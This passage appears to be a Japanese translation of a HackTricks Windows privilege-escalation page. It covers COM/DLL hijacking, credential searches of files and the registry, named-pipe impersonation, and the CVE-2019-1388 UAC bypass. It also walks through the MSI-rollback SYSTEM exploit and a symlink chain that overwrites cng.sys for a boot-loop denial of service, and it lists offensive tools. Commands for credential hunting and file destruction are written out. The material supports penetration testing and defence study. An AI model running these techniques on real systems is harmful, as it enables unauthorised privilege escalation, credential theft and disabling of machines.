COM classes と interfaces は registry の **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** にそれぞれ定義されています。この registry は **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.** をマージして作成されます。

この registry の CLSIDs の中には child registry の **InProcServer32** があり、そこには **DLL** を指す **default value** と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、または **Neutral** (Thread Neutral) にできる **ThreadingModel** という値が含まれています。

![](<../../images/image (729).png>)

基本的に、実行される **DLLs** のいずれかを **overwrite** できれば、その DLL が別の user によって実行される場合に **escalate privileges** できます。

攻撃者が永続化の仕組みとして COM Hijacking をどう使うかを学ぶには、次を確認してください:


{{#ref}}
com-hijacking.md
{{endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名のファイルを検索する**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索する**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索するツール

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は msf** プラグインで、私が作成したものです。これにより、**victim 内で credentials を検索するすべての metasploit POST module を自動実行**できます。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで言及されている password を含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、システムから password を抽出するためのもう1つの優れたツールです。

ツール [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) は、これらのデータを平文で保存するいくつかのツール（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM**として実行中のプロセスが、`OpenProcess()` を使って**フルアクセス**で新しいプロセスを開くとします。さらに同じプロセスが、`CreateProcess()` で**低権限**の新しいプロセスを作成しますが、メインプロセスの**すべての open handles を継承**するとします。\
その後、**低権限プロセスに対するフルアクセス**を持っていれば、`OpenProcess()` で作成された**特権プロセスへの open handle** を取得して、**shellcode を注入**できます。\
[この脆弱性を**検出して悪用する方法**の詳細は、この例を読んでください。](leaked-handle-exploitation.md)\
[**異なる権限レベルで継承された process や thread のさらに多くの open handlers をテストして悪用する方法**について、より完全な説明がある別の投稿はこちらです。](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**pipes** と呼ばれる共有メモリセグメントは、プロセス間通信とデータ転送を可能にします。

Windows には **Named Pipes** と呼ばれる機能があり、無関係なプロセス同士でも、異なるネットワーク上であってもデータを共有できます。これはクライアント/サーバー型の構成に似ており、役割は **named pipe server** と **named pipe client** に分かれます。

**client** によって pipe 経由でデータが送られると、その pipe を設定した **server** は、必要な **SeImpersonate** 権限があれば、**client の ID を引き受ける**ことができます。pipe で通信する**特権プロセス**を特定してそれを模倣できれば、あなたが作成した pipe にそのプロセスが接続した瞬間に、その ID を引き継いで**より高い権限を得る**機会になります。この攻撃の実行方法については、[**here**](named-pipe-client-impersonation.md) と [**here**](#from-high-integrity-to-system) にあるガイドが役立ちます。

また、以下のツールを使うと、**burp のようなツールで named pipe communication を intercept する**ことができます: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **さらにこのツールは、privescs を見つけるためにすべての pipes を一覧表示して確認することもできます** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony サービス (TapiSrv) の server mode は `\\pipe\\tapsrv` (MS-TRP) を公開します。remote authenticated client は mailslot ベースの async event path を悪用して `ClientAttach` を任意の **4-byte write** に変え、`NETWORK SERVICE` が書き込める任意の既存ファイルへ書き込めます。その後、Telephony の admin 権限を取得し、サービスとして任意の DLL をロードできます。全体の流れ:

- `pszDomainUser` を書き込み可能な既存パスに設定した `ClientAttach` → サービスはそれを `CreateFileW(..., OPEN_EXISTING)` で開き、async event writes に使用する。
- 各 event は `Initialize` の attacker-controlled な `InitContext` をそのハンドルへ書き込む。`LRegisterRequestRecipient` (`Req_Func 61`) で line app を登録し、`TRequestMakeCall` (`Req_Func 121`) をトリガーして、`GetAsyncEvents` (`Req_Func 0`) で取得し、その後 unregister/shutdown して deterministic writes を繰り返す。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分を追加し、再接続してから、任意の DLL パスを指定して `GetUIDllName` を呼び出すと、`TSPI_providerUIIdentify` が `NETWORK SERVICE` として実行される。

詳細:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Misc

### File Extensions that could execute stuff in Windows

**[https://filesec.io/](https://filesec.io/)** を確認してください

### Protocol handler / ShellExecute abuse via Markdown renderers

クリック可能な Markdown リンクが `ShellExecuteExW` に渡されると、危険な URI handler (`file:`, `ms-appinstaller:`、または登録済みの任意の scheme) を起動し、攻撃者が制御するファイルを現在のユーザーとして実行できる場合があります。詳しくは:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitoring Command Lines for passwords**

ユーザーとして shell を取得したとき、credentials を command line で渡す scheduled tasks や他の processes が実行されている可能性があります。以下の script は、2 秒ごとに process の command line を取得し、前回の状態と比較して、差分を出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## プロセスからパスワードを盗む

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（console または RDP 経由）にアクセスでき、UAC が有効な場合、Microsoft Windows の一部のバージョンでは、権限のないユーザーから terminal や "NT\AUTHORITY SYSTEM" のような他の任意の process を実行できることがあります。

これにより、同じ脆弱性で privilege escalation と UAC bypass を同時に行うことが可能になります。さらに、何かをインストールする必要はなく、プロセス中に使用される binary は Microsoft によって署名され発行されています。

影響を受けるシステムの一部は次のとおりです:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性を悪用するには、次の手順を実行する必要があります:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium から High Integrity Level へ / UAC Bypass

Integrity Levels について学ぶには、これを読んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、UAC と UAC bypass について学ぶには、これを読んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## 任意の Folder Delete/Move/Rename から SYSTEM EoP へ

この technique は [**この blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されており、exploit code は [**こちらで入手可能**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) です。

この attack は基本的に、Windows Installer の rollback feature を悪用して、uninstallation process 中に正規の file を malicious なものに置き換えるものです。そのために attacker は、`C:\Config.Msi` folder を hijack するために使われる **malicious MSI installer** を作成する必要があります。これは後で Windows Installer が、他の MSI packages の uninstallation 中に rollback files を保存するために使われ、その rollback files は malicious payload を含むように改ざんされます。

要約すると、technique は次のとおりです:

1. **Stage 1 – Hijack の準備 (`C:\Config.Msi` を空に保つ)**

- Step 1: MSI を install する
- 書き込み可能な folder (`TARGETDIR`) に無害な file（例: `dummy.txt`）を install する `.msi` を作成する。
- installer を **"UAC Compliant"** としてマークし、**non-admin user** が実行できるようにする。
- install 後、その file の **handle** を開いたままにしておく。

- Step 2: Uninstall を開始する
- 同じ `.msi` を uninstall する。
- uninstall process は file を `C:\Config.Msi` に移動し、`.rbf` files（rollback backups）に rename し始める。
- `GetFinalPathNameByHandle` を使って開いている file handle を **poll** し、file が `C:\Config.Msi\<random>.rbf` になったタイミングを検出する。

- Step 3: Custom Syncing
- `.msi` には、**custom uninstall action (`SyncOnRbfWritten`)** が含まれている:
- `.rbf` が書き込まれたときに signal する。
- その後、続行する前に別の event を **wait** する。

- Step 4: `.rbf` の削除をブロックする
- signal されたら、`FILE_SHARE_DELETE` なしで `.rbf` file を開く — これにより **削除できなくなる**。
- その後、uninstall を終えられるように再度 **signal** する。
- Windows Installer は `.rbf` を削除できず、すべての contents を削除できないため、**`C:\Config.Msi` は削除されない**。

- Step 5: `.rbf` を手動削除する
- attacker が `.rbf` file を手動で削除する。
- これで **`C:\Config.Msi` は空** になり、hijack の準備が整う。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability** を trigger して `C:\Config.Msi` を delete する。

2. **Stage 2 – Rollback scripts を malicious なものに置き換える**

- Step 6: 弱い ACLs で `C:\Config.Msi` を再作成する
- `C:\Config.Msi` folder を自分で再作成する。
- **弱い DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` 付きで **handle を開いたまま** にする。

- Step 7: 別の install を実行する
- `.msi` を再度 install する。以下を指定する:
- `TARGETDIR`: 書き込み可能な location。
- `ERROROUT`: forced failure を引き起こす variable。
- この install は rollback を再び trigger するために使われ、`.rbs` と `.rbf` を読み込む。

- Step 8: `.rbs` を監視する
- `ReadDirectoryChangesW` を使って `C:\Config.Msi` を監視し、新しい `.rbs` が現れるまで待つ。
- その filename を取得する。

- Step 9: Rollback 前に sync する
- `.msi` には、**custom install action (`SyncBeforeRollback`)** が含まれている:
- `.rbs` が作成されたときに event を signal する。
- その後、続行する前に **wait** する。

- Step 10: 弱い ACL を再適用する
- `.rbs created` event を受け取った後:
- Windows Installer は `C:\Config.Msi` に **strong ACLs** を再適用する。
- しかし、`WRITE_DAC` を持つ handle をまだ持っているため、**弱い ACLs を再度適用** できる。

> ACLs は **handle open 時にのみ enforce** されるため、folder へ書き込み続けられる。

- Step 11: 偽の `.rbs` と `.rbf` を配置する
- `.rbs` file を上書きし、Windows に次を指示する **偽の rollback script** を書き込む:
- `.rbf` file（malicious DLL）を **privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）へ restore する。
- **malicious SYSTEM-level payload DLL** を含む偽の `.rbf` を配置する。

- Step 12: Rollback を trigger する
- sync event を signal して installer を再開させる。
- **type 19 custom action (`ErrorOut`)** が、既知の point で install を意図的に fail させるよう設定されている。
- これにより **rollback が開始** される。

- Step 13: SYSTEM が DLL を install する
- Windows Installer は:
- あなたの malicious な `.rbs` を読む。
- あなたの `.rbf` DLL を target location にコピーする。
- これで、**SYSTEM-loaded path** に malicious DLL が置かれる。

- 最終 Step: SYSTEM code を execute する
- 信頼された **auto-elevated binary**（例: `osk.exe`）を実行し、hijack した DLL を load させる。
- **Boom**: code が **SYSTEM として** 実行される。


### 任意の File Delete/Move/Rename から SYSTEM EoP へ

前の main MSI rollback technique は、`C:\Config.Msi` のような **folder 全体** を delete できることを前提としています。では、vulnerability が **任意の file deletion** しか許さない場合はどうでしょうか？

**NTFS internals** を悪用できます。すべての folder には hidden な alternate data stream があり、次のように呼ばれます:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
この stream は、フォルダの **index metadata** を保存します。

そのため、フォルダの **`::$INDEX_ALLOCATION` stream** を**削除**すると、NTFS はファイルシステムから**フォルダ全体**を削除します。

これは次のような標準的なファイル削除 API を使って実行できます:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* の delete API を呼び出しているにもかかわらず、実際には**フォルダ自体を delete します**。

### Folder Contents Delete から SYSTEM EoP へ
あなたの primitive が任意の file/folder の delete を許可しないが、攻撃者が制御する folder の**contents のみを delete できる**場合はどうなるでしょうか？

1. Step 1: bait folder と file を setup する
- 作成: `C:\temp\folder1`
- その中に: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を置く
- oplock は、特権 process が `file1.txt` を delete しようとしたときに**execution を pause** します。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process をトリガーする（例: `SilentCleanup`）
- このプロセスはフォルダ（例: `%TEMP%`）をスキャンし、その内容を削除しようとする。
- `file1.txt` に到達すると、**oplock がトリガーされ**、制御があなたの callback に渡される。

4. Step 4: oplock callback 内で – deletion をリダイレクトする

- Option A: `file1.txt` を別の場所に移動する
- これにより、oplock を壊さずに `folder1` が空になる。
- `file1.txt` を直接 delete しないこと — それをすると oplock が早すぎるタイミングで release される。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Option C: `\RPC Control` に **symlink** を作成する:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダのメタデータを保存している NTFS の内部ストリームを狙っている — それを削除するとフォルダも削除される。

5. Step 5: oplock を解放する
- SYSTEM process は処理を続けて `file1.txt` を削除しようとする。
- しかし今は、junction + symlink のため、実際には次を削除している:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意フォルダ作成から永続的 DoS へ

**SYSTEM/admin として任意のフォルダを作成できる** プリミティブを悪用します — **ファイルを書き込めない**、または**弱い権限を設定できない** 場合でもです。

**重要な Windows ドライバ** の名前を持つ **フォルダ**（ファイルではなく）を作成します。例:
```
C:\Windows\System32\cng.sys
```
- これは通常、`cng.sys` の kernel-mode driver に対応します。
- これを**事前に folder として作成**すると、Windows は起動時に実際の driver を load できなくなります。
- その後、Windows は boot 中に `cng.sys` の load を試みます。
- folder を検出し、**実際の driver を解決できず**、**crash するか boot を停止**します。
- **fallback はなく**、外部からの介入（例: boot repair や disk access）なしでは**復旧できません**。

### 特権 log/backup path + OM symlink から arbitrary file overwrite / boot DoS へ

**privileged service** が **writable config** から読み取った path に log/export を書き込む場合、**Object Manager symlink + NTFS mount point** でその path をリダイレクトし、特権 write を arbitrary overwrite に変えられます（**SeCreateSymbolicLinkPrivilege なし**でも可）。

**要件**
- target path を保存している config が attacker により書き込み可能であること（例: `%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- その path に書き込む privileged operation があること（log, export, report）。

**例の chain**
1. config を読んで privileged log destination を取得する。例: `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. admin なしで path を redirect:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例: admin が "send test SMS" をトリガーする）。この書き込みは `C:\Windows\System32\cng.sys` に入る。
4. 上書きされた対象を確認する（hex/PE parser）ことで破損を確認する。再起動すると Windows は改ざんされた driver path を読み込むことになり → **boot loop DoS**。これは、特権サービスが書き込みのために開く任意の保護されたファイルにも一般化できる。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` から読み込まれるが、`C:\Windows\System32\cng.sys` にコピーが存在すると、そちらが先に試行される可能性があり、破損データに対する信頼できる DoS sink となる。



## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **path to SYSTEM** can be easy just **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> サービス binary を作成する際は、それが有効な service であること、または binary が必要な処理を十分に高速に実行することを確認してください。そうしないと 20s で kill されます。

### AlwaysInstallElevated

High Integrity process から、**AlwaysInstallElevated registry entries を有効化**して、_**.msi**_ wrapper を使って reverse shell を **install** できます。\
[関連する registry keys の詳細と _.msi_ package の install 方法についてはここを参照してください。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは**[**ここで見つけられます**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っている場合（おそらく既に High Integrity process で見つかるでしょう）、SeDebug privilege を使って**ほぼ任意の process**（protected processes 以外）を**開き**、process の token を**コピー**して、その token を使って**任意の process を作成**できます。\
この technique では通常、**SYSTEM として実行されている任意の process を選び、すべての token privileges を持つものを使います**（_はい、すべての token privileges を持たない SYSTEM process もあります_）。\
**この technique を実行する code の**[**例はここで見つかります**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は meterpreter が `getsystem` で privilege を escalate するときに使います。手法は、**pipe を作成し、その pipe に書き込む service を作成または abuse する**ことです。すると、**`SeImpersonate`** privilege を使って pipe を作成した **server** は、pipe client（service）の**token を impersonate** でき、SYSTEM privileges を取得できます。\
name pipes について[**さらに学びたい場合はこれを読んでください**](#named-pipe-client-impersonation)。\
high integrity から System へ name pipes を使って移行する例を[**読みたい場合はこれを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**読み込まれる** **SYSTEM** として実行されている **process** の dll を **hijack** できれば、その権限で arbitrary code を実行できます。したがって Dll Hijacking もこの種の privilege escalation に有用であり、さらに、**high integrity process からのほうがはるかに簡単**です。なぜなら、dll を読み込むために使われるフォルダに対して **write permissions** を持っているからです。\
**Dll hijacking についてはここでさらに学べます**[**こちら**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すための最良の tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files を確認します (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- いくつかの possible misconfigurations を確認し、情報を収集します (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**)。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations を確認します**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP の保存済み session information を抽出します。local では -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から crendentials を抽出します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- domain 全体に収集した passwords を spray します**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell の ADIDNS/LLMNR/mDNS spoofer および man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索します（DEPRECATED for Watson）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Local checks **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索します（VisualStudio を使って compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を探しながら host を enumerate します（privesc というより情報収集 tool です）（compile が必要）**(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多くの software から credentials を抽出します（github に precompiled exe あり）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# 版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration を確認します（executable は github に precompiled あり）。非推奨です。Win10 ではうまく動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な misconfigurations を確認します（python から exe を生成）。非推奨です。Win10 ではうまく動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post を基に作成された tool です（正しく動作するために accesschk は不要ですが、使用することはできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の出力を読み取り、動作する exploits を推奨します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の出力を読み取り、動作する exploits を推奨します（local python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

適切な .NET の version を使って project を compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host にインストールされている .NET の version を確認するには、次を実行できます：
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
